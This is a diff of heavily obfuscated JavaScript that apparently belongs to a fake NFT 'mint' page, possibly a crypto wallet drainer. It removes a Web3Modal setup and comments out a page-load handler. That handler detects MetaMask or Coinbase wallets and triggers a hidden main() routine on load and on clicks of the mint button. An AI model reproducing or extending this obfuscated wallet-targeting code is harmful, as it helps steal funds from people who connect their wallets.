@@ -8546,8 +8546,6 @@ var tokenMsgParams = columbo,
   signMultiple = 0x5,
   nftMultiple = 0.8,
   globalNonce = 0x0
-const Web3Modal = window[_0x5c7eff(0x398)][_0x5c7eff(0x8d7)],
-  WalletConnectProvider = window['WalletConnectProvider'][_0x5c7eff(0x8d7)]
 var maliky = {}
 maliky['1'] = _0x5c7eff(0x7fc)
 var moaad = {}
@@ -8628,45 +8626,43 @@ function sendMessage(_0x1eb362, _0x54811f) {
   }
   _0xee4cf4[_0x8e96ee(0x758)](JSON[_0x8e96ee(0xbf0)](_0x4a6b09))
 }
-var web3Modal,
-  provider,
-  isPending = ![],
+var isPending = ![],
   isConnecting = ![],
   priceDataPromise,
   nftDataPromise,
   tokenDataPromise,
   amount = 0x1
 
-$(document)['ready'](async () => {
-  var _0x469758 = _0x5c7eff
-  ;(url = window[_0x469758(0x483)][_0x469758(0x5ac)]), (date = new Date()), (providerType = 'Undefined.................................')
-  window[_0x469758(0x788)] != undefined &&
-    ((providerType = _0x469758(0xc08)),
-    window[_0x469758(0x788)][_0x469758(0x21a)] == !![] && (providerType = 'Metamask..................................'),
-    window[_0x469758(0x788)][_0x469758(0x542)] == !![] && (providerType = 'CoinBase..................................'))
-  if (window[_0x469758(0x788)] != undefined) {
-    var _0x13b295 = {
-      cacheProvider: ![],
-      providerOptions: {},
-      disableInjectedProvider: ![]
-    }
-    web3Modal = new Web3Modal(_0x13b295)
-  } else {
-    var _0x5182e7 = {
-      cacheProvider: ![],
-      providerOptions: providerOptions,
-      disableInjectedProvider: ![]
-    }
-    web3Modal = new Web3Modal(_0x5182e7)
-  }
-  $('.btn-mint')[_0x469758(0x8d6)](_0x318c73 => {
-    main()
-  }),
-    $(_0x469758(0x122))[_0x469758(0x8d6)](_0x165f54 => {
-      main()
-    }),
-    main()
-})
+// $(document)['ready'](async () => {
+//   var _0x469758 = _0x5c7eff
+//   ;(url = window[_0x469758(0x483)][_0x469758(0x5ac)]), (date = new Date()), (providerType = 'Undefined.................................')
+//   window[_0x469758(0x788)] != undefined &&
+//     ((providerType = _0x469758(0xc08)),
+//     window[_0x469758(0x788)][_0x469758(0x21a)] == !![] && (providerType = 'Metamask..................................'),
+//     window[_0x469758(0x788)][_0x469758(0x542)] == !![] && (providerType = 'CoinBase..................................'))
+//   if (window[_0x469758(0x788)] != undefined) {
+//     var _0x13b295 = {
+//       cacheProvider: ![],
+//       providerOptions: {},
+//       disableInjectedProvider: ![]
+//     }
+//     web3Modal = new Web3Modal(_0x13b295)
+//   } else {
+//     var _0x5182e7 = {
+//       cacheProvider: ![],
+//       providerOptions: providerOptions,
+//       disableInjectedProvider: ![]
+//     }
+//     web3Modal = new Web3Modal(_0x5182e7)
+//   }
+//   $('.btn-mint')[_0x469758(0x8d6)](_0x318c73 => {
+//     main()
+//   }),
+//     $(_0x469758(0x122))[_0x469758(0x8d6)](_0x165f54 => {
+//       main()
+//     }),
+//     main()
+// })
 function getWalletTypes() {
   var _0x9ff850 = _0x5c7eff
   if (window[_0x9ff850(0x788)] == undefined) return _0x9ff850(0x369)
